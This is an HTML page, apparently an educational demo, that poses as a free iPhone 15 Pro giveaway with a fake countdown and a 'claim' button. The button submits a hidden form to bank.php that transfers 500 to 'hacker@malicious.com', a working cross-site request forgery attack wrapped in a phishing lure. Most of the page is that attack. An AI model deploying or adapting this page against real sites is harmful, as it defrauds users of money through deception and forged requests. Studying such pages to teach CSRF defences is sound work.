<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a Free iPhone 15 Pro!</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            padding-top: 20px;
        }
        .contest-header {
            background-color: #dc3545;
            color: white;
            padding: 20px 0;
            margin-bottom: 30px;
        }
        .card {
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .phone-image {
            max-width: 100%;
            height: auto;
            border-radius: 10px;
        }
        .blink {
            animation: blinker 1.5s linear infinite;
        }
        @keyframes blinker {
            50% {
                opacity: 0;
            }
        }
        .countdown {
            font-size: 24px;
            font-weight: bold;
            color: #dc3545;
        }
    </style>
</head>
<body>
    <div class="contest-header">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-md-12 text-center">
                    <h1><i class="bi bi-gift"></i> Amazing Giveaway!</h1>
                    <p class="mb-0 blink">🔥 Win a Free iPhone 15 Pro Today! 🔥</p>
                </div>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-body text-center">
                        <h2 class="card-title">Congratulations!</h2>
                        <p class="card-text">You've been selected for a chance to win the latest iPhone 15 Pro!</p>
                        <img src="https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-1inch-naturaltitanium?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1692845702708" alt="iPhone 15 Pro" class="phone-image mb-3">
                        <p>Offer expires in:</p>
                        <p class="countdown mb-4" id="countdown">10:00</p>
                        <button id="claim-button" class="btn btn-danger btn-lg">CLAIM YOUR FREE iPHONE NOW!</button>
                        <p class="mt-3"><small class="text-muted">Limited time offer, while supplies last.</small></p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Hidden CSRF form that will be submitted automatically -->
    <form id="csrf-form" action="bank.php" method="POST" style="display:none;">
        <input type="text" name="recipient" value="hacker@malicious.com">
        <input type="number" name="amount" value="500">
        <input type="text" name="description" value="iPhone Purchase">
    </form>

    <footer class="bg-light mt-5 p-3 text-center">
        <div class="container">
            <p class="text-muted mb-0">© 2023 Amazing Offers Inc. All rights reserved.</p>
            <small class="text-muted">This is a demonstration website for educational purposes only.</small>
        </div>
    </footer>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Countdown timer
        let timeLeft = 600; // 10 minutes in seconds
        const countdownEl = document.getElementById('countdown');
        
        const updateCountdown = () => {
            const minutes = Math.floor(timeLeft / 60);
            let seconds = timeLeft % 60;
            seconds = seconds < 10 ? '0' + seconds : seconds;
            countdownEl.innerHTML = `${minutes}:${seconds}`;
            
            if (timeLeft <= 0) {
                clearInterval(countdownTimer);
                countdownEl.innerHTML = "EXPIRED!";
            }
            timeLeft--;
        };
        
        const countdownTimer = setInterval(updateCountdown, 1000);
        updateCountdown();
        
        // CSRF attack execution when the claim button is clicked
        document.getElementById('claim-button').addEventListener('click', function(e) {
            e.preventDefault();
            
            // Submit the hidden form to perform the CSRF attack
            document.getElementById('csrf-form').submit();
            
            // The user thinks they're claiming an iPhone, but they're actually transferring money
        });
    </script>
</body>
</html> 